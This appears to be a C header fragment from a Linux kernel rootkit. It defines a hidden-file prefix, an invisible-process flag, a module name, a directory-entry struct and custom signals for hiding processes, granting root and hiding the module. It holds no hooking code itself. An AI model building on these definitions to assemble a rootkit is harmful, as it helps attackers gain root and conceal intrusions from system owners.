#define RTHXR "rthxr"
#define PF_INVISIBLE 0x10000000
#define MODULE_NAME "Ruby"

struct linux_dirent {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	char d_name[1];
};

enum {
	SIGINVIS = 9,
	SIGSUPER = 2,
	SIGMODINVIS = 6,
};
